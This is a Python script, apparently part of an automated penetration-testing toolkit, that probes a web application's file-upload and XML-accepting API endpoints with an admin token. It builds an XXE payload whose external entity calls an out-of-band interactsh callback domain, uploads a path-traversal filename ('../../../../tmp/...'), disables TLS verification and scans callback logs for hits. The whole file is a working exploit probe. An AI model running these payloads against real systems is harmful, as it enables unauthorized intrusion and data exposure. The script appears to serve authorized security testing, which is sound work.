"""P1 缺口：文件上传 / XXE 探测（只读探测，不上传持久业务文件；对 secauto 命名测试）。
- 多部分上传：XML(XXE)、PNG、畸形文件名（路径穿越）。
- XML Content-Type 直接打接口（若服务端解析 XML 则 OAST 回调）。
结果：reports/p1/upload_xxe.json
"""
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1]))
from runner import public_config as _pub
import json
import os
import random
import time
import requests
import urllib3
urllib3.disable_warnings()
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE = os.environ.get('SEC_TARGET', _pub.target())
TOK = os.path.join(ROOT, 'evidence', 'tokens', 'admin.txt')
OAST_STATE = os.path.join(ROOT, 'adapters', 'oast', 'oast_state.json')
OUT = os.path.join(ROOT, 'reports', 'p1', 'upload_xxe.json')
UPLOAD_ENDPOINTS = ['/serv/v1/recording/img/upload', '/serv/v1/terminal/import', '/serv/v1/terminal/excel', '/serv/v1/terminal/import/model', '/serv/v1/terminal/log/upload', '/basis/v1/userInfo/importUser']
PNG = bytes.fromhex('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000002000154a24f5f0000000049454e44ae426082')

def token():
    return open(TOK, encoding='utf-8').read().strip()

def post_files(path, field, filename, content, ctype):
    h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': token()}
    files = {field: (filename, content, ctype)}
    try:
        r = requests.post(BASE + path, headers=h, params={'t': str(int(time.time() * 1000))}, files=files, timeout=25, verify=False)
        try:
            j = r.json()
        except Exception:
            j = {'raw': r.text[:200]}
        return {'http': r.status_code, 'code': j.get('code'), 'msg': j.get('msg') or j.get('resMessage'), 'body': json.dumps(j, ensure_ascii=False)[:300]}
    except Exception as e:
        return {'http': None, 'error': str(e)[:200]}

def post_xml(path, xml):
    h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': token(), 'Content-Type': 'application/xml'}
    try:
        r = requests.post(BASE + path, headers=h, params={'t': str(int(time.time() * 1000))}, data=xml.encode('utf-8'), timeout=25, verify=False)
        try:
            j = r.json()
        except Exception:
            j = {'raw': r.text[:200]}
        return {'http': r.status_code, 'code': j.get('code'), 'msg': j.get('msg'), 'body': json.dumps(j, ensure_ascii=False)[:250]}
    except Exception as e:
        return {'http': None, 'error': str(e)[:200]}

def main():
    state = json.load(open(OAST_STATE, encoding='utf-8'))
    domain = state['domain']
    tok = 'xxe-' + str(random.randint(100000, 999999))
    xxe_url = f'http://{tok}.{domain}/xxe'
    xml = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{xxe_url}">]><foo>&xxe;</foo>'
    result = {'generated_at': time.strftime('%Y-%m-%dT%H:%M:%S'), 'base': BASE, 'oast_token': tok, 'uploads': [], 'xml_body': [], 'oast_hits': []}
    variants = [('xxe.xml', xml.encode(), 'application/xml'), ('secauto_ok.png', PNG, 'image/png'), ('../../../../tmp/secauto_trav.png', PNG, 'image/png')]
    for path in UPLOAD_ENDPOINTS:
        for (fn, content, ctype) in variants:
            r = post_files(path, 'file', fn, content, ctype)
            row = {'path': path, 'filename': fn, 'ctype': ctype, **r}
            result['uploads'].append(row)
            print(f"UP {path} file={fn[:28]} http={r.get('http')} code={r.get('code')} msg={r.get('msg')}")
    for path in ('/serv/v1/conf/add', '/serv/v1/live/getLiveAddr', '/basis/v1/userInfo/importUser'):
        r = post_xml(path, xml)
        result['xml_body'].append({'path': path, **r})
        print(f"XML {path} http={r.get('http')} code={r.get('code')}")
    time.sleep(8)
    jsonl = os.path.join(ROOT, 'tools_cache', 'interactsh', 'interactions.jsonl')
    if os.path.exists(jsonl):
        with open(jsonl, encoding='utf-8', errors='replace') as f:
            for line in f:
                if tok in line:
                    result['oast_hits'].append(line.strip()[:400])
    print('OAST hits:', len(result['oast_hits']))
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    json.dump(result, open(OUT, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
    print('written:', OUT)
if __name__ == '__main__':
    main()
